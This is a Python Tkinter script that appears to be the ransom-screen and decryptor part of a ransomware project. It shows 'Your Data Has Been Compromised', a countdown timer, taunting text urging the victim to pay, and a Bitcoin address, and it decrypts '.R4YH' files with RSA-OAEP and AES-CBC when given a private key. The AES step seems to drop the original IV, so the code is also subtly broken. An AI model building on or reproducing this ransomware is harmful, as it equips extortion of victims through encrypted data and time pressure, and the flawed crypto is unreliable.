#Import the required Libraries
from tkinter import *
from tkinter import ttk, filedialog
import os
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.PublicKey import RSA
from pathlib import Path
from Crypto.Util.Padding import unpad



password = StringVar

#Create an instance of Tkinter frame
win = Tk()

#Set the geometry of Tkinter frame
win.geometry("1500x1000")
win.title('OOPS !')
win.resizable(height=False,width=False)

background_image = PhotoImage(file="/home/behana/rans/head.png")
background_label = Label(win, image=background_image)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

label_title=Label(win, text="Your Data Has Been Compromised", font=("Courier 22 bold"), bg='red')
label_title.pack(pady=50)

def countdown(count):
    # change text in label
    # count = '01:30:00'
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label_countdown['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        # call countdown again after 1000ms (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        win.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 
#The funtion that is called when the user press enter password in line 57
private_key_path = "/home/behana/rans/received_key.pem"



def decrypt_file(path, private_key):
    with open(path, 'rb') as f:
        content = f.read()

    file_extension = '.R4YH'
    original_name = Path(path).stem.replace(file_extension, '')

    encrypted_session_key = content[:private_key.size_in_bytes()]
    cipher_rsa = PKCS1_OAEP.new(private_key)
    aes_session_key = cipher_rsa.decrypt(encrypted_session_key)

    cipher_aes = AES.new(aes_session_key, AES.MODE_CBC)
    decrypted_data = unpad(cipher_aes.decrypt(content[private_key.size_in_bytes():]), AES.block_size)

    with open(original_name, 'wb') as f:
        f.write(decrypted_data)






def upload_private_key():
    global private_key_path
    #private_key = RSA.import_key(open(private_key_path, 'rb').read())
    private_key_path = filedialog.askopenfilename(title="Select Private Key File", filetypes=[("PEM Files", "*.pem")])
    private_key = RSA.import_key(open(private_key_path, 'rb').read())

    dir = Path('/home/behana/rans')
    for file in dir.rglob('*'):
        if file.suffix.lower() == '.r4yh':
            decrypt_file(file, private_key)
            os.remove(file)

#Create an Entry widget to accept User Input
entry = Entry(win, width= 40)
entry.focus_set()
entry.place(x= 620, y= 300)

#Create a Button to validate Entry Widget
ttk.Button(win, text= "Enter the Private Key",width= 20, command= upload_private_key).place(x=700, y=340)

label_countdown = Label(win, text="", font=("Courier 22 bold"))
label_countdown.place(x=1220, y=50)
countdown('01:30:00')

label_Q1=Label(win, text="What Happends ?", font=('Courier ', 18 ,'italic bold'))
label_Q1.place(x=90, y=50)

text_box = Text(win, height=14, width=35 ,font=("Courier 12 bold"))
text_box.place(x=40, y= 100)

# Insert text into the Text widget
paragraph = """Your computer has been compromised 
by a ransomware attack. 
Your files have been encrypted 
and are inaccessible.
To regain access to your data, 
you will need to follow the 
instructions provided by 
the attackers. 
Please refrain from attempting 
to access or modify any files 
on your own, as it may result in 
permanent data loss."""
text_box.insert(END, paragraph)

def center_text():
    # Get the number of lines in the Text widget
    num_lines = text_box.index("end-1c").split('.')[0]
    
    # Set the insertion cursor to the center of the Text widget
    text_box.mark_set("insert", f"{num_lines}.0")
    
    # Insert a newline to center the text
    text_box.insert(INSERT, "\n")

# Call the function to center the text
center_text()

label_Q2=Label(win, text="How To Be A Good Person", font=('Courier ', 18 ,'italic bold'))
label_Q2.place(x=57, y=450)

text_box2 = Text(win, height=22, width=35 ,font=("Courier 12 bold"))
text_box2.place(x=40, y= 500)

# Insert text into the Text widget
paragraph2 = """After all, what's more admirable 
than bending over backward to 
accommodate someone who's 
holding your information hostage? 
And let's not forget the cherry on 
top – sending money through an 
untraceable digital currency 
to an anonymous address, 
because transparency and 
accountability are overrated,
am I right? 
So, go ahead, be the beacon of 
morality and send that ransom 
straight to their Bitcoin address.
Who knows,
maybe they'll even send you
a thank-you note for
your generosity... or not. 
PS: Stay calm until you receive 
the password by email."""
text_box2.insert(END, paragraph2)

def center_text2():
    # Get the number of lines in the Text widget
    num_lines = text_box2.index("end-1c").split('.')[0]
    
    # Set the insertion cursor to the center of the Text widget
    text_box2.mark_set("insert", f"{num_lines}.0")
    
    # Insert a newline to center the text
    text_box2.insert(INSERT, "\n")

# Call the function to center the text
center_text2()

text_box3 = Text(win, height=16, width=35 ,font=("Courier 12 bold"))
text_box3.place(x=1100, y= 100)

# Insert text into the Text widget
paragraph = """It's a race against time, folks!
 Because obviously, the best 
 decisions are made under
 pressure, especially when 
 they involve potentially 
 irreversible consequences. 
 So, go ahead, embrace the thrill
 of the countdown, and make 
 that payment before your data 
 vanishes into the abyss forever!
 Tick tock, tick tock... 
 the clock's ticking, 
 and your data's itching
 to disappear!"""
text_box3.insert(END, paragraph)

def center_text3():
    # Get the number of lines in the Text widget
    num_lines = text_box3.index("end-1c").split('.')[0]
    
    # Set the insertion cursor to the center of the Text widget
    text_box3.mark_set("insert", f"{num_lines}.0")
    
    # Insert a newline to center the text
    text_box3.insert(INSERT, "\n")

# Call the function to center the text
center_text3()

label_stat=Label(win, text="This is the Bitcoin Address: ", font=("Courier 22 bold"))
label_stat.place(x= 530, y= 650)
label_addr=Label(win, text="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", font=("Courier 22 bold"))
label_addr.place(x= 480, y= 685)

win.mainloop()
